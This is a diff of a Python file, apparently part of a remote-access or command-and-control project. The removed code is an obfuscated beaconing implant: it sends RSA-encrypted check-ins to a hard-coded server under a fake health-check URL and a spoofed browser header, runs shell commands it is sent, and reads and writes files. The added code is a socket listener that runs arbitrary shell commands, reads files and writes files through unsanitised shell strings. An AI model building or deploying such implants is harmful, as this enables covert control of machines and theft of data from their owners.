@@ -1,115 +1,76 @@
-import json, time, random, requests, subprocess, base64, os
-from cryptography.hazmat.primitives import serialization, hashes
-from cryptography.hazmat.primitives.asymmetric import rsa, padding
-from cryptography.hazmat.backends import default_backend
-from flask import jsonify
+# https://www.geeksforgeeks.org/python/socket-programming-python/
+import socket             
+# import pwn   
+import subprocess
+import base64
 
-
-# Obfuscation keys
-CUSTOM_ABC = "zxywvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA0123456789-_"
-STD_ABC    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-XOR_KEY    = "C2_SECRET_KEY"
-
-SERVER_IP = "10.37.1.249"
-
-def custom_b64_e(data):
-   if isinstance(data, str): data = data.encode()
-   encoded = base64.b64encode(data).decode().replace('=', '')
-   return encoded.translate(str.maketrans(STD_ABC, CUSTOM_ABC))
-
-
-def custom_b64_d(data):
-   decoded = data.translate(str.maketrans(CUSTOM_ABC, STD_ABC))
-   return base64.b64decode(decoded + '=' * (-len(decoded) % 4)).decode()
-
-
-def xor_decode(hex_data):
-   data = bytes.fromhex(hex_data).decode()
-   return ''.join(chr(ord(data[i]) ^ ord(XOR_KEY[i % len(XOR_KEY)])) for i in range(len(data)))
-
-
-# RSA Key Management
-def _init_keys():
-   try:
-       with open('ssh_private_key.pem', 'rb') as f:
-           priv = serialization.load_pem_private_key(f.read(), None, default_backend())
-       with open('ssh_public_key.pem', 'rb') as f:
-           pub = serialization.load_pem_public_key(f.read(), default_backend())
-   except FileNotFoundError:
-       priv = rsa.generate_private_key(65537, 2048, default_backend())
-       pub = priv.public_key()
-       with open('ssh_private_key.pem', 'wb') as f: f.write(priv.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
-       with open('ssh_public_key.pem', 'wb') as f: f.write(pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
-   return priv, pub
-
-
-def _load_server_key():
-   with open('server_public_key.pem', 'rb') as f: return serialization.load_pem_public_key(f.read(), default_backend())
-
-
-PRIV, PUB = _init_keys()
-S_PUB = _load_server_key()
-AID = os.urandom(4).hex()
-RUNNING = True
-SLEEP_MIN, SLEEP_MAX = 5, 10
-
-
-def enc_s(d):
-   if isinstance(d, str): d = d.encode()
-   return base64.b64encode(S_PUB.encrypt(d, padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None))).decode()
-
-
-def dec_s(d):
-   return PRIV.decrypt(base64.b64decode(d), padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None)).decode()
-
-
-# Standardized error response
-def error_response(code, message, request_id=None, status_code=400):
-   return jsonify({"status": "ERROR", "code": code, "message": message, "request_id": request_id}), status_code
-
-
-# Beacon function for agent check-in and task retrieval
-def beacon():
-   pub_pem = PUB.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()
-   headers = {"X-Agent-Key": custom_b64_e(pub_pem), "User-Agent": "Mozilla/5.0"}
-   payload = enc_s(json.dumps({"a": AID, "r": os.urandom(4).hex()}))
-   try:
-       r = requests.post(f"http://{SERVER_IP}:3000/api/health", json={"data": payload}, headers=headers)
-       if r.status_code == 200:
-           resp = json.loads(dec_s(r.json().get("data")))
-           if resp.get("t"): execute_task(resp["t"])
-   except Exception as e:
-       error_response(500, f"Beacon error: {str(e)}")
-
-
-# Task execution based on command type
-def execute_task(t):
-   global SLEEP_MIN, SLEEP_MAX, RUNNING
-   cmd = xor_decode(t["c"])
-   rid = t["r"]
-   p = t["p"]
-   out = ""
-   try:
-       if cmd == "RUN_CMD":
-           out = subprocess.check_output(p["cmd"], shell=True, stderr=subprocess.STDOUT).decode()
-       elif cmd == "READ_DATA":
-           with open(p["path"], 'r') as f: out = f.read()
-       elif cmd == "WRITE_DATA":
-           with open(p["path"], 'w') as f: f.write(p["val"])
-           out = "File written successfully."
-       elif cmd == "SET_SLEEP":
-           SLEEP_MIN, SLEEP_MAX = p.get("min", 5), p.get("max", 10)
-           out = f"Sleep updated to {SLEEP_MIN}-{SLEEP_MAX}s"
-       elif cmd == "SHUTDOWN":
-           out = "Agent shutting down."; RUNNING = False
-   except Exception as e: error_response(500, f"Task execution error: {str(e)}", request_id=rid)
+def fixed_xor(arg1: bytes, arg2: bytes) -> bytes:
+    assert len(arg1) == len(arg2), "Trying to xor mismatched lengths!"
+    return bytes([arg1[i] ^ arg2[i] for i in range(len(arg1))])
   
-   rep = enc_s(json.dumps({"a": AID, "r": rid, "o": custom_b64_e(out[:120])}))
-   requests.post(f"http://{SERVER_IP}:3000/api/report", json={"data": rep})
+def xor(message: bytes, key: bytes) -> bytes:
+    assert len(message) >= len(key)
+    ret = []
+    for i in range(len(message)):
+        ret.append(message[i] ^ key[i % len(key)])
+    return bytes(ret)
 
 
-if __name__ == "__main__":
-   print(f"Agent {AID} online.")
-   while RUNNING:
-       beacon()
-       if RUNNING: time.sleep(random.randint(SLEEP_MIN, SLEEP_MAX))
+s = socket.socket()         
+print ("Socket successfully created")
+
+port = 8080
+key = b"ED IS COOL"
+
+def enc(plaintext):
+  return base64.encodebytes(xor(plaintext, key))
+
+def dec(ciphertext):
+  return xor(base64.decodebytes(ciphertext), key)
+
+
+s.bind(('', port))         
+print ("socket binded to %s" %(port)) 
+
+s.listen(5)     
+print ("socket is listening")   
+c, addr = s.accept()     
+print ('Got connection from', addr )
+
+while True:
+  s = dec(c.recv(1600)).decode()
+  print(s)
+  req_type, id, data = s.split('  ')
+  print(req_type)
+  
+  if req_type == 'HELO':
+    c.send(enc(f"HI  {id}".encode()))
+    
+  elif req_type == 'EXIT':
+    c.send(enc(f"OK  {id}  ending connection".encode()))
+    break
+  
+  elif req_type == 'READ':
+    result = subprocess.run(f"cat {data}", shell=True, capture_output=True, text=True)
+    c.send(enc(f"OK  {id}  {result.stdout.encode()}".encode()))
+    
+  elif req_type == 'RITE':
+    print(data)
+    content, file = data.split(' to ')
+    result = subprocess.run(f"echo {content} > {file}", shell=True, capture_output=True, text=True)
+    print(result.stdout, result.stderr)
+    c.send(enc(f"OK  {id}  {result.stdout.encode()}".encode()))
+
+  elif req_type == 'CMD':
+    result = subprocess.run(f"{data}", shell=True, capture_output=True, text=True)
+    print(result.stdout, result.stderr)
+    c.send(enc(f"OK  {id}  {result.stdout.encode()}".encode()))
+
+  elif req_type == 'ERR':
+    c.send(enc(f"OK  {id}  ending connection".encode()))
+    break
+  
+  # send a thank you message to the client. encoding to send byte type. 
+c.send(enc('Thank you for connecting'.encode()))
+
+c.close()
